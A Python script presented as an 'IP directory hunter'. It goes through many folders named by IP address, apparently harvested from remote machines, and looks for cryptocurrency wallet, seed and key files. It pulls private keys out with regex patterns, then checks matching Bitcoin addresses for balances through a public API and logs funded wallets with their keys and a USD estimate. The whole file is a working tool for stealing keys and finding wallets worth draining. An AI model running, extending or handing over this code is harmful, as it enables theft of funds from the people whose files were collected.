#!/usr/bin/env python3
"""
Deep Net607 IP Directory Hunter
Scan through all IP-based directories for wallet files and private keys
"""

import os
import json
import re
import asyncio
from datetime import datetime
import glob

class DeepNet607Hunter:
    def __init__(self):
        self.base_dir = "/home/admin/wallet_tool/net607"
        self.processed_dirs_file = "PROCESSED_IP_DIRECTORIES.json"
        
        self.wallet_file_patterns = [
            "*.wallet",
            "*.dat",
            "*.key",
            "*wallet*",
            "*crypto*",
            "*bitcoin*",
            "*ethereum*",
            "*metamask*",
            "*exodus*",
            "*electrum*",
            "*coinbase*",
            "*binance*",
            "*trust*",
            "*atomic*",
            "*private*key*"
        ]
        
        self.text_file_patterns = [
            "*.txt",
            "*.log",
            "*.json",
            "*.csv"
        ]
        
        self.private_key_patterns = [
            r'[0-9a-fA-F]{64}',  # 64-char hex (Bitcoin/Ethereum private keys)
            r'0x[0-9a-fA-F]{64}',  # 0x prefixed
            r'[15K][1-9A-HJ-NP-Za-km-z]{25,34}',  # Bitcoin WIF format
            r'bc1[a-z0-9]{39,59}',  # Bitcoin Bech32
            r'0x[a-fA-F0-9]{40}',  # Ethereum addresses
        ]
        
        self.found_keys = set()
        self.interesting_files = []
        self.processed_directories = self.load_processed_directories()
    
    def load_processed_directories(self):
        """Load list of previously processed IP directories"""
        try:
            if os.path.exists(self.processed_dirs_file):
                with open(self.processed_dirs_file, 'r') as f:
                    data = json.load(f)
                    processed = set(data.get('processed_directories', []))
                    print(f"📋 Loaded {len(processed)} previously processed directories")
                    return processed
            else:
                print(f"📋 No previous directory tracking found - starting fresh")
                return set()
        except Exception as e:
            print(f"⚠️ Error loading processed directories: {e}")
            return set()
    
    def save_processed_directories(self):
        """Save the list of processed directories"""
        try:
            tracking_data = {
                'last_updated': datetime.now().isoformat(),
                'total_processed': len(self.processed_directories),
                'processed_directories': list(self.processed_directories)
            }
            
            with open(self.processed_dirs_file, 'w') as f:
                json.dump(tracking_data, f, indent=2)
                
            print(f"💾 Saved {len(self.processed_directories)} processed directories to {self.processed_dirs_file}")
        except Exception as e:
            print(f"⚠️ Error saving processed directories: {e}")
    
    def mark_directory_as_processed(self, ip_dir):
        """Mark a directory as processed"""
        self.processed_directories.add(ip_dir)
    
    def get_unprocessed_directories(self):
        """Get list of IP directories that haven't been processed yet"""
        all_dirs = self.get_all_ip_directories()
        unprocessed = [d for d in all_dirs if d not in self.processed_directories]
        
        print(f"🌐 Found {len(all_dirs)} total IP directories")
        print(f"✅ Already processed: {len(self.processed_directories)}")
        print(f"🔍 Remaining to process: {len(unprocessed)}")
        
        return unprocessed
    
    def get_all_ip_directories(self):
        """Get list of all IP directories"""
        try:
            return [d for d in os.listdir(self.base_dir) 
                   if os.path.isdir(os.path.join(self.base_dir, d)) and d.startswith('[')]
        except Exception as e:
            print(f"Error listing directories: {e}")
            return []
    
    def scan_directory_for_wallet_files(self, ip_dir):
        """Scan a single IP directory for wallet files"""
        full_path = os.path.join(self.base_dir, ip_dir)
        found_files = []
        
        try:
            # Walk through all subdirectories
            for root, dirs, files in os.walk(full_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Check for wallet-related files by pattern
                    file_lower = file.lower()
                    
                    # High priority files
                    if any(pattern in file_lower for pattern in [
                        'wallet', 'crypto', 'bitcoin', 'ethereum', 'metamask',
                        'exodus', 'electrum', 'coinbase', 'binance', 'private',
                        'key', 'seed', 'mnemonic'
                    ]):
                        found_files.append({
                            'file': file_path,
                            'name': file,
                            'priority': 'high',
                            'type': 'wallet_related'
                        })
                    
                    # Medium priority files (text files that might contain keys)
                    elif file.endswith(('.txt', '.log', '.json', '.csv', '.key', '.dat')):
                        found_files.append({
                            'file': file_path,
                            'name': file,
                            'priority': 'medium', 
                            'type': 'text_file'
                        })
        
        except Exception as e:
            print(f"Error scanning {ip_dir}: {e}")
        
        return found_files
    
    def extract_keys_from_file(self, file_path):
        """Extract private keys from a single file"""
        keys_found = []
        
        try:
            # Try to read as text
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Search for private key patterns
            for pattern in self.private_key_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Clean up the match
                    clean_key = match.replace('0x', '').strip()
                    
                    # Validate length for private keys
                    if len(clean_key) == 64 and all(c in '0123456789abcdefABCDEF' for c in clean_key):
                        keys_found.append({
                            'key': clean_key.lower(),
                            'file': file_path,
                            'type': 'private_key_hex',
                            'original': match
                        })
                    elif len(clean_key) in [51, 52] and (clean_key.startswith('5') or clean_key.startswith('K') or clean_key.startswith('L')):
                        keys_found.append({
                            'key': clean_key,
                            'file': file_path,
                            'type': 'private_key_wif',
                            'original': match
                        })
        
        except Exception as e:
            # File might be binary or corrupted
            pass
        
        return keys_found
    
    def hunt_ip_directory(self, ip_dir):
        """Hunt through a single IP directory"""
        print(f"🔍 Hunting {ip_dir}...")
        
        # Find relevant files
        files = self.scan_directory_for_wallet_files(ip_dir)
        
        if not files:
            return []
        
        keys_found = []
        high_priority_files = [f for f in files if f['priority'] == 'high']
        
        if high_priority_files:
            print(f"   🎯 Found {len(high_priority_files)} high-priority wallet files!")
            
        # Extract keys from files (prioritize high-priority files)
        priority_order = sorted(files, key=lambda x: 0 if x['priority'] == 'high' else 1)
        
        for file_info in priority_order[:20]:  # Limit to prevent overwhelming
            file_keys = self.extract_keys_from_file(file_info['file'])
            if file_keys:
                keys_found.extend(file_keys)
                print(f"   💎 Found {len(file_keys)} keys in {file_info['name']}")
        
        return keys_found
    
    async def hunt_all_directories(self):
        """Hunt through all IP directories"""
        print("🚀 DEEP NET607 IP DIRECTORY HUNT")
        print("=" * 60)
        print(f"📅 Hunt Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Get unprocessed IP directories
        unprocessed_dirs = self.get_unprocessed_directories()
        
        if not unprocessed_dirs:
            print("✅ All IP directories have been processed!")
            print("🔄 Run with --reset flag to reprocess all directories")
            return
        
        all_keys = []
        interesting_ips = []
        
        # Process directories in batches (50 at a time to avoid overwhelming)
        batch_size = 50
        dirs_to_process = unprocessed_dirs[:batch_size]
        
        print(f"📦 Processing batch of {len(dirs_to_process)} directories")
        if len(unprocessed_dirs) > batch_size:
            print(f"⏭️  {len(unprocessed_dirs) - batch_size} directories will remain for next run")
        
        for i, ip_dir in enumerate(dirs_to_process):
            print(f"\n🌍 [{i+1}/{len(dirs_to_process)}] Processing {ip_dir}")
            
            keys = self.hunt_ip_directory(ip_dir)
            
            if keys:
                all_keys.extend(keys)
                interesting_ips.append({
                    'ip_dir': ip_dir,
                    'keys_found': len(keys)
                })
                
                print(f"   ✅ Total keys from {ip_dir}: {len(keys)}")
            else:
                print(f"   📭 No keys found in {ip_dir}")
            
            # Mark directory as processed
            self.mark_directory_as_processed(ip_dir)
        # Deduplicate keys
        unique_keys = {}
        for key_info in all_keys:
            key = key_info['key']
            if key not in unique_keys:
                unique_keys[key] = key_info
        
        # Save processed directories
        self.save_processed_directories()
        
        print(f"\n📊 HUNT SUMMARY")
        print("-" * 40)
        print(f"   IP Directories Processed: {len(dirs_to_process)}")
        print(f"   Total Directories Processed: {len(self.processed_directories)}")
        print(f"   Remaining Unprocessed: {len(unprocessed_dirs) - len(dirs_to_process)}")
        print(f"   Interesting IPs Found: {len(interesting_ips)}")
        print(f"   Total Keys Extracted: {len(all_keys)}")
        print(f"   Unique Keys: {len(unique_keys)}")
        
        if unique_keys:
            # Save results
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            results_file = f"DEEP_NET607_HUNT_RESULTS_{timestamp}.json"
            
            hunt_results = {
                'hunt_info': {
                    'type': 'deep_net607_hunt',
                    'started_at': datetime.now().isoformat(),
                    'ip_directories_processed': len(dirs_to_process),
                    'total_processed_so_far': len(self.processed_directories),
                    'remaining_directories': len(unprocessed_dirs) - len(dirs_to_process),
                    'keys_found': len(unique_keys)
                },
                'processed_directories': dirs_to_process,
                'interesting_ips': interesting_ips,
                'unique_keys': list(unique_keys.values()),
                'summary': {
                    'extraction_rate': f"{len(interesting_ips)}/{len(dirs_to_process)} directories had keys",
                    'key_sources': len(set([k['file'] for k in unique_keys.values()]))
                }
            }
            
            with open(results_file, 'w') as f:
                json.dump(hunt_results, f, indent=2)
            
            print(f"\n💾 Results saved to: {results_file}")
            
            # Now check balances for these new keys
            print(f"\n🔍 CHECKING BALANCES FOR NEW KEYS")
            print("-" * 40)
            
            from bitcoin import privkey_to_address
            import requests
            
            funded_wallets = []
            
            for key_data in list(unique_keys.values())[:100]:  # Check first 100 keys
                try:
                    private_key = key_data['key']
                    
                    # Generate Bitcoin address
                    if key_data['type'] == 'private_key_hex':
                        address = privkey_to_address(private_key)
                        
                        # Quick balance check
                        try:
                            url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
                            response = requests.get(url, timeout=5)
                            if response.status_code == 200:
                                data = response.json()
                                balance = data.get('balance', 0)
                                
                                if balance > 0:
                                    funded_wallets.append({
                                        'address': address,
                                        'balance': balance,
                                        'balance_btc': balance / 100000000,
                                        'private_key': private_key,
                                        'source': key_data['file']
                                    })
                                    print(f"   💰 FUNDED: {address} = {balance/100000000:.8f} BTC")
                        except:
                            pass
                            
                except Exception as e:
                    continue
                
                # Rate limiting
                await asyncio.sleep(0.1)
            
            if funded_wallets:
                print(f"\n🎉 DEEP HUNT SUCCESS!")
                print(f"   New Funded Wallets: {len(funded_wallets)}")
                
                total_btc = sum(w['balance_btc'] for w in funded_wallets)
                print(f"   Total New BTC: {total_btc:.8f}")
                print(f"   Estimated USD: ${total_btc * 65000:.2f}")
                
                # Save funded results
                funded_file = f"DEEP_HUNT_FUNDED_{timestamp}.json"
                with open(funded_file, 'w') as f:
                    json.dump({
                        'funded_wallets': funded_wallets,
                        'hunt_timestamp': datetime.now().isoformat(),
                        'source': 'deep_net607_hunt'
                    }, f, indent=2)
                
                print(f"   💾 Funded wallets saved to: {funded_file}")
            else:
                print(f"\n📭 No funded wallets found in sampled keys")
        else:
            print(f"\n📭 No private keys extracted from IP directories")
        
        return len(unique_keys)
    
    def reset_processed_directories(self):
        """Reset the tracking of processed directories"""
        try:
            if os.path.exists(self.processed_dirs_file):
                os.remove(self.processed_dirs_file)
            self.processed_directories = set()
            print("🔄 Reset processed directories tracking - will reprocess all directories")
        except Exception as e:
            print(f"⚠️ Error resetting processed directories: {e}")

async def main():
    import sys
    
    hunter = DeepNet607Hunter()
    
    # Check for reset flag
    if '--reset' in sys.argv:
        hunter.reset_processed_directories()
    
    # Check for status flag
    if '--status' in sys.argv:
        unprocessed = hunter.get_unprocessed_directories()
        print(f"\n📊 DIRECTORY PROCESSING STATUS")
        print("=" * 40)
        print(f"Total IP Directories: {len(hunter.get_all_ip_directories())}")
        print(f"Already Processed: {len(hunter.processed_directories)}")
        print(f"Remaining to Process: {len(unprocessed)}")
        
        if len(unprocessed) > 0:
            print(f"\n🔍 Next batch to process (up to 50):")
            for i, dir_name in enumerate(unprocessed[:10]):
                print(f"   {i+1}. {dir_name}")
            if len(unprocessed) > 10:
                print(f"   ... and {len(unprocessed)-10} more")
        return
    
    results = await hunter.hunt_all_directories()

if __name__ == "__main__":
    asyncio.run(main())
